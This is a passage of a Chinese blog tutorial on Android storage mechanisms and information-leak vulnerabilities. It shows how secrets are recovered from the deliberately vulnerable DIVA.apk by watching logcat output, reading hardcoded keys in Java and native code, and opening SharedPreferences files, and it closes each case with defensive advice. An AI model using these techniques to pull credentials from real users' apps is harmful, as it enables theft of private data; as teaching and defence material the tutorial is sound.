class="type">SharedPreferences</span> <span class="variable">pref</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pref.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> pref.getInt(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isMarried</span> <span class="operator">=</span> pref.getBoolean(<span class="string">&quot;isMarried&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-SQLite数据库存储"><a href="#3-SQLite数据库存储" class="headerlink" title="3. SQLite数据库存储"></a>3. SQLite数据库存储</h3><p>SharedPreferences对象与SQLite数据库相比，免去了创建数据库、创建表、写SQL语句等操作，但是其只能存储boolean，int，float，long和String五种简单的数据类型，而且SharedPreferences是以明文的形式存储密钥信息，往往存在一定的安全隐患。为此Android还提供了一个轻量级的数据库SQLite数据库，SQLite是轻量级嵌入式数据库引擎，它支持 SQL 语言，并且只利用很少的内存就有很好的性能</p><p>默认存储路径：<code>/data/data/packagename/databases</code></p><h4 id="（1）数据库的创建"><a href="#（1）数据库的创建" class="headerlink" title="（1）数据库的创建"></a>（1）数据库的创建</h4><p>Android 提供了SQLiteOpenHelper类帮助创建和升级数据库，SQLiteOpenHelper子类至少需要实现三个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造函数，调用父类SQLiteOpenHelper的构造函数。需要四个参数（上下文环境、数据库名称、查询数据的游标Cursor(通常为<span class="literal">null</span>)、当前数据库的版本号）</span><br><span class="line"><span class="number">2.</span>onCreate（）方法，它需要一个 SQLiteDatabase 对象作为参数，根据需要对这个对象填充表和初始化数据</span><br><span class="line"><span class="number">3.</span>onUpgrage() 方法，它需要三个参数，一个 SQLiteDatabase 对象，一个旧的版本号和一个新的版本号，这样就可以方便的实现数据库的升级</span><br></pre></td></tr></table></figure><p>继承 SQLiteOpenHelper 创建数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line">    <span class="comment">//1.构造方法</span></span><br><span class="line">  MyDatabaseHelper(Context context, String name, CursorFactory cursorFactory, <span class="type">int</span> version)  </span><br><span class="line">  &#123;      </span><br><span class="line">    <span class="built_in">super</span>(context, name, cursorFactory, version);      </span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line">     <span class="meta">@Override</span>     </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;      </span><br><span class="line">         <span class="comment">// TODO 创建数据库后，对数据库的操作      </span></span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line">     <span class="meta">@Override</span>     </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;      </span><br><span class="line">         <span class="comment">// TODO 升级数据库版本 </span></span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line"> <span class="meta">@Override</span>     </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(SQLiteDatabase db)</span> &#123;      </span><br><span class="line">         <span class="built_in">super</span>.onOpen(db);        </span><br><span class="line">         <span class="comment">// TODO 每次成功打开数据库后首先被执行      </span></span><br><span class="line">     &#125;      </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="（2）数据库的更新"><a href="#（2）数据库的更新" class="headerlink" title="（2）数据库的更新"></a>（2）数据库的更新</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span>&#123;  </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//当打开数据库时传入的版本号与当前的版本号不同时会调用该方法  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;   </span><br><span class="line">          db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">          onCreate(db):</span><br><span class="line">    &#125;    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>只要我们在MainActivity中将version改为大于原来版本号，就可以让<code>onUpgrade()</code>方法得到执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyDatabaseHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>,<span class="string">&quot;BookStore.db&quot;</span>,<span class="literal">null</span>,<span class="number">2</span>);</span><br><span class="line">helper.getWritableDatabase(); </span><br></pre></td></tr></table></figure><h4 id="（3）数据库的基本操作"><a href="#（3）数据库的基本操作" class="headerlink" title="（3）数据库的基本操作"></a>（3）数据库的基本操作</h4><p>添加数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;The Book Name&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;chen&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;pages&quot;</span>,<span class="number">100</span>);</span><br><span class="line">values.put(<span class="string">&quot;price&quot;</span>,<span class="number">200</span>);</span><br><span class="line">db.insert(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,values);<span class="comment">//参数一 表名 参数二 未指定添加数据的情况下为NULL 参数三 ContentValues对象</span></span><br></pre></td></tr></table></figure><p>更新数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;price&quot;</span>,<span class="number">120</span>);</span><br><span class="line">db.update(<span class="string">&quot;Book&quot;</span>,values,<span class="string">&quot;name= ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;The Book Name&quot;</span>&#125;);  <span class="comment">//参数一 表名 参数二 ContentValues对象 参数三、四是去约束更新某一行或某几行的数据，不指定默认更新所有</span></span><br></pre></td></tr></table></figure><p>删除数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line">db.delete(<span class="string">&quot;Book&quot;</span>,<span class="string">&quot;pages&gt; ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;100&quot;</span>&#125;); <span class="comment">//参数一是表名，参数二、三是去约束删除某一行或某几行的数据，不指定默认删除所有</span></span><br></pre></td></tr></table></figure><p>查询数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="comment">//query()方法，参数一是表名，参数二是指定查询哪几列，默认全部，参数三、四是去约束查询某一行或某几行的数据，不指定默认查询所有，参数五是用于指定需要去group by的列，参数六是对group by的数据进一步的过滤，参数七是查询结果的排序方式</span></span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.query(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">            <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">&#125;</span><br><span class="line">cursor.close();</span><br></pre></td></tr></table></figure><p>SQL语句操作数据库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;insert into Book(name,author,pages,price) values(?,?,?,?) &quot;</span></span><br><span class="line">            ,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;The Book Name&quot;</span>,<span class="string">&quot;chen&quot;</span>,<span class="number">100</span>,<span class="number">20</span>&#125;);</span><br><span class="line"><span class="comment">//更新数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]</span><br><span class="line">            &#123;<span class="string">&quot;10&quot;</span>,<span class="string">&quot;The Book Name&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;100&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//查询数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;select * from Book&quot;</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>使用事务操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line">db.beginTransaction();  <span class="comment">//开启事务</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">      ......</span><br><span class="line">      db.insert(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,values);</span><br><span class="line">      db.setTransactionSuccessful();  <span class="comment">//事务成功执行</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(SQLException e)&#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">      db.endTransaction();  <span class="comment">//结束事务</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然Android数据库中还包括<code>LitePal</code>数据库更加方便的操作，由于本文主要是介绍漏洞，所以这里就简单介绍到这里</p><h3 id="4-ContentProvider"><a href="#4-ContentProvider" class="headerlink" title="4. ContentProvider"></a>4. ContentProvider</h3><p>前面三种方式是Android中基本的存储方式，但是由于都存在一个公共的缺点：不能实现不同应用程序之间进行数据共享，大家都知道Android是采用沙箱的管理机制，不同的应用程序之间都是独立隔离开的，这一定程度上也是为了Android 应用之间的安全性考虑，但是如果应用之间不能很好的进行交互，那么很显然就带来了明显的不便，因此为了解决这个问题，内容提供器——ContentProvider就孕育而生了，由于前面我们有专门的章节讲述这一组件，所以本文只是简单描述，不详细了解，请参考<a href="https://bbs.pediy.com/thread-269447.htm">Android APP漏洞之战（4）——Content Provider漏洞详解</a></p><p>主要作用：用于不同的程序之间实现数据共享的功能，并通过ContentResolver进行操作</p><p>ContentResolver使用方法：</p><p>（1）内容URI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包名为com.example.app的表table1访问路径</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span>  <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.example.app.provider/table1&quot;</span>);</span><br></pre></td></tr></table></figure><p>（2）使用URI对象进行数据操作</p><p><strong>查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> getContentResolver().query(uri,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor != <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">column1</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;column1&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">column2</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;column2&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      cursor.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>插入</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;column1&quot;</span>,<span class="string">&quot;text&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;column2&quot;</span>,<span class="number">1</span>);</span><br><span class="line">getContentResolver().insert(uri,values);</span><br></pre></td></tr></table></figure><h3 id="5-网络存储"><a href="#5-网络存储" class="headerlink" title="5.网络存储"></a>5.网络存储</h3><p>Android网络存储主要是通过网络来实现数据的存储和获取，这里主要调用WebService返回的数据或是解析HTTP协议实现网络数据交互，具体需要熟悉java.net.*，Android.net.*这两个包的内容，因为不是Android的主流存储方式，这里主要参考相应文档即可，也不是本文漏洞所关注的主要对象，就不做过多叙述了</p><p>网络存储需要开启权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>具体可参考本文参考文献</p><h2 id="三、信息泄露漏洞的安全场景和分类"><a href="#三、信息泄露漏洞的安全场景和分类" class="headerlink" title="三、信息泄露漏洞的安全场景和分类"></a>三、信息泄露漏洞的安全场景和分类</h2><h3 id="1-漏洞的安全场景"><a href="#1-漏洞的安全场景" class="headerlink" title="1.漏洞的安全场景"></a>1.漏洞的安全场景</h3><p>信息泄露漏洞往往是指APP开发过程中一些不安全的开发问题导致敏感信息的泄露，那我们首先可以将敏感信息进行分类：产品敏感信息和用户敏感信息</p><h4 id="（1）产品敏感信息"><a href="#（1）产品敏感信息" class="headerlink" title="（1）产品敏感信息"></a>（1）产品敏感信息</h4><p>产品敏感信息：登录密码、后台登录及数据库地址、服务器部署的绝对路径、内部ip、地址分配规则、网络拓扑、页面注释信息等</p><h4 id="（2）用户敏感信息"><a href="#（2）用户敏感信息" class="headerlink" title="（2）用户敏感信息"></a>（2）用户敏感信息</h4><p>用户的个人隐私信息泄露导致被恶意人员利用获取不当信息，例如用户的密码，账户信息等等</p><p>这些敏感信息泄露往往是由于信息未加密或存储位置不当造成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码中明文使用敏感信息，比如：服务器地址、数据库信息等</span><br><span class="line">数据库中明文保存敏感信息，比如：账号、密码、银行卡等</span><br><span class="line">SD卡中保存敏感信息或隐私信息,比如：聊天记录、通讯录等</span><br><span class="line">日志打印敏感信息,比如：账号、密码</span><br><span class="line">明文传输敏感信息</span><br></pre></td></tr></table></figure><h3 id="2-漏洞的分类"><a href="#2-漏洞的分类" class="headerlink" title="2.漏洞的分类"></a>2.漏洞的分类</h3><p>综上我们将Android中的信息泄露漏洞大致可分为：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/33.png" alt="image-20220104172608948"></p><h2 id="四、信息泄露漏洞的原理分析和复现"><a href="#四、信息泄露漏洞的原理分析和复现" class="headerlink" title="四、信息泄露漏洞的原理分析和复现"></a>四、信息泄露漏洞的原理分析和复现</h2><p>本文为了简单演示各个漏洞的复现情况，将会使用样本DIVA.apk和一些实际漏洞的场景，样本将放到附件中</p><h3 id="1-LogCat输出敏感信息漏洞"><a href="#1-LogCat输出敏感信息漏洞" class="headerlink" title="1. LogCat输出敏感信息漏洞"></a>1. LogCat输出敏感信息漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息</p><p>一般来说，LogCat敏感信息输出漏洞包括：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">应用层Log敏感信息输出</span><br><span class="line">应用层System.out.println敏感信息输出</span><br><span class="line">系统bug异常导致Log输出</span><br><span class="line">Native层敏感Log输出</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞案例——DIVA-apk例题1"><a href="#（2）漏洞案例——DIVA-apk例题1" class="headerlink" title="（2）漏洞案例——DIVA.apk例题1"></a>（2）漏洞案例——DIVA.apk例题1</h4><p>首先，我们安装样本DIVA.apk</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/6.png" alt="image-20220104111529461"></p><p>然后我们打开例题1，并开启日志监控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep diva</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/7.png" alt="image-20220104112058929"></p><p>我们在app表单总输入内容，check out后查看相关日志</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/8.png" alt="image-20220104112212227"></p><p>我们就可以发现我们输入的密钥信息，然后我们根据日志信息，可以找到漏洞代码在LogActivity.class文件，我们查看相关代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/9.png" alt="image-20220104112932530"></p><p>这里相关代码就是将敏感信息给泄露，当然我们真实的app中不会这么简单，但这确实一个很好的思路，比如我们对我们分析的app中的敏感信息的函数进行hook或者通过插桩日志的信息，我们就可以成功获得敏感信息了</p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Android Studio中配置ProGuard实现release版apk自动删除Log.d()/v()等代码</span><br><span class="line"><span class="number">2.</span>使用自定义LogCat类，上线前关闭LogCat开关</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LG</span>&#123;</span><br><span class="line">    <span class="comment">//是否开启debug</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">isDebug</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">e</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.e</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">i</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.i</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">w</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.w</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.d</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-硬编码问题漏洞"><a href="#2-硬编码问题漏洞" class="headerlink" title="2.硬编码问题漏洞"></a>2.硬编码问题漏洞</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>一些开发人员，在开发时使用硬编码的方式，导致存在一定的安全风险，硬编码一般是指将输出或输入的相关参数以常量的方式编写在源代码中，这样导致逆向分析人员可以直接通过分析源码就可以获得敏感信息</p><h4 id="（2）漏洞案例——DIVA-apk例题2（java层）"><a href="#（2）漏洞案例——DIVA-apk例题2（java层）" class="headerlink" title="（2）漏洞案例——DIVA.apk例题2（java层）"></a>（2）漏洞案例——DIVA.apk例题2（java层）</h4><p>我们打开样本app的例题2</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/10.png" alt="image-20220104143848066"></p><p>我们分析对应app相关的逆向代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/11.png" alt="image-20220104143950575"></p><p>我们可以发现相应的敏感信息被直接用来判断，采用硬编码的方式，我们直接将密钥输入，发现可以成功破译</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/12.png" alt="image-20220104144243905"></p><h4 id="（3）漏洞案例——DIVA-apk例题12（so层）"><a href="#（3）漏洞案例——DIVA-apk例题12（so层）" class="headerlink" title="（3）漏洞案例——DIVA.apk例题12（so层）"></a>（3）漏洞案例——DIVA.apk例题12（so层）</h4><p>我们打开例题12</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/28.png" alt="image-20220104170422773"></p><p>我们分析对应的代码段</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/29.png" alt="image-20220104170535933"></p><p>说明key被保存在libsoName.so库中，我们将文件打开</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/30.png" alt="image-20220104170746729"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/31.png" alt="image-20220104171214316"></p><p>经过分析，我们确定这就是我们的键值，我们输入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/32.png" alt="image-20220104171352572"></p><p>说明key放在so层中也是不安全的</p><p>密钥硬编码案例：</p><p>下面为乌云平台一些APP漏洞案例，详细可做参考：</p><p><a href="436b34f44b9f95fd3aa8667f1ad451b16a683c5957c8d733b3809de3444b7c6fffae9f78c9c65e6f292dd695bd96daa0c3f153ebdaeb4f1b582e5c13e28f97c3601018d9e8a589033217ff27785e473dbcc50607f5530dd0a63dd6f512327a46effe31c0ed8b01752287563eebc03bf2495aa785bf000246363bd83dc65459799e5b2af9e74fcc8cb84b8c8b55ba087b6c184ae39c9f8a03cef3622956a4767be83bc3c2f93d8931185a3a9c47e527aed5b7fe1c570c1cc866fc201b62a8c5ba0ca75d7a1d0fd6dd53c3b3d342a74ce414334ae0d1bb980becf489b072cfaaaf00f6d3ac37f973c7970274827c26ecbb177cc4fa5d38d9ece06ab2b5a4bf7147">密钥硬编码</a></p><h4 id="（4）安全防护"><a href="#（4）安全防护" class="headerlink" title="（4）安全防护"></a>（4）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>对明文传输的密钥进行加密传输</span><br><span class="line"><span class="number">2.</span>采用变量的方式去读取，不采用硬解码的方式</span><br><span class="line"><span class="number">3.</span>对java层中进行混淆，对so层中进行ollvm控制流混淆</span><br></pre></td></tr></table></figure><h3 id="3-Shared-Preference全局可读写漏洞"><a href="#3-Shared-Preference全局可读写漏洞" class="headerlink" title="3. Shared Preference全局可读写漏洞"></a>3. Shared Preference全局可读写漏洞</h3><h4 id="（1）原理分析-2"><a href="#（1）原理分析-2" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Shared Preferences存储安全风险在于：开发者在创建文件时没有正确的选择合适的创建模式（MODE_PRIVATE、MODE_WOELD_READABLE以及MODE_WORLD_WRITEABBLE）进行权限控制，导致将一些用户信息、密码等敏感信息存储在Shared Preferences文件中，攻击者可以通过root来查看敏感信息</p><h4 id="（2）漏洞案例——DIVA-apk例题3"><a href="#（2）漏洞案例——DIVA-apk例题3" class="headerlink" title="（2）漏洞案例——DIVA.apk例题3"></a>（2）漏洞案例——DIVA.apk例题3</h4><p>我们进入例题3：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/13.png" alt="image-20220104145137669"></p><p>我们分析对应的逆向代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/14.png" alt="image-20220104145233158"></p><p>经过我们前文的分析，很明显这里采用的是SharedPreference的存储方式</p><p>我们输入相关的账号和密码，然后我们可以进入shared_prefs查看相关的文件</p><p><img 